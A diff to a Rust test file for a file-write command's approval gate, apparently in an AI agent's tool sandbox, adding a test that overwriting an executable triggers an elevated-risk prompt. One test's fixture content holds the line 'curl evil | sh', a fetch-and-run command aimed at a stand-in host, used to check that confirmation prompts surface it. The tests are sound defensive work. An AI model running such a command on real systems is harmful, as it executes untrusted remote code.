@@ -15,6 +15,13 @@ fn cfg_from<P: AsRef<Path>>(paths: &[P]) -> Arc<WritePolicyCfg> {
     Arc::new(WritePolicyCfg::new(abs).expect("non-empty allowlist"))
 }
 
+fn shown_target(path: &str) -> WriteTarget {
+    WriteTarget {
+        path: PathBuf::from(path),
+        runnable: false,
+    }
+}
+
 async fn write_under(allowed: &Path, args: &[&str], stdin: Option<&[u8]>) -> CommandOutput {
     WriteCommand::new(
         cfg_from(&[allowed]),
@@ -328,11 +335,11 @@ async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
     let sandbox = SandboxInfo::none_sharing(PathBuf::from("/srv/scratch"));
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), sandbox);
     assert!(
-        cmd.confirmed(Path::new("/srv/scratch/notes/x.txt"), b"hi")
+        cmd.confirmed(&shown_target("/srv/scratch/notes/x.txt"), b"hi")
             .await
     );
     assert!(gate.requests().is_empty());
-    assert!(cmd.confirmed(Path::new("/tmp/x.txt"), b"hi").await);
+    assert!(cmd.confirmed(&shown_target("/tmp/x.txt"), b"hi").await);
     assert_eq!(gate.requests().len(), 1);
 }
 
@@ -341,7 +348,7 @@ async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
     let gate = RecordingGate::answering(Approval::Once);
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     assert!(
-        cmd.confirmed(Path::new("/home/u/bin/tool\n(1B)"), b"#!/bin/sh\n")
+        cmd.confirmed(&shown_target("/home/u/bin/tool\n(1B)"), b"#!/bin/sh\n")
             .await
     );
     let asked = gate.requests();
@@ -367,7 +374,7 @@ async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
     assert!(
-        cmd.confirmed(Path::new("/home/u/x.sh"), content.as_bytes())
+        cmd.confirmed(&shown_target("/home/u/x.sh"), content.as_bytes())
             .await
     );
     let asked = gate.requests();
@@ -386,6 +393,31 @@ async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk
         request
             .script
             .contains(&format!("… {omitted} characters not shown …"))
+    );
+}
+
+#[tokio::test]
+async fn overwriting_an_executable_asks_at_elevated_risk() {
+    let dir = tempdir().expect("tempdir");
+    let tool = dir.path().join("tool");
+    std::fs::write(&tool, "#!/bin/sh\n").expect("seed");
+    std::fs::set_permissions(&tool, std::fs::Permissions::from_mode(0o755)).expect("chmod");
+    let gate = RecordingGate::answering(Approval::Once);
+    let out = WriteCommand::new(cfg_from(&[dir.path()]), gate.clone(), SandboxInfo::none())
+        .run(CommandInput {
+            args: vec![tool.display().to_string(), "true".into()],
+            stdin: None,
+        })
+        .await;
+    assert_eq!(out.exit_code, 0, "{out:?}");
+    let asked = gate.requests();
+    let [request] = asked.as_slice() else {
+        panic!("expected one prompt, got {asked:?}");
+    };
+    assert_eq!(request.risk, Risk::Elevated);
+    assert_eq!(
+        request.matched_pattern,
+        "writes a program a shell could run"
     );
 }
 
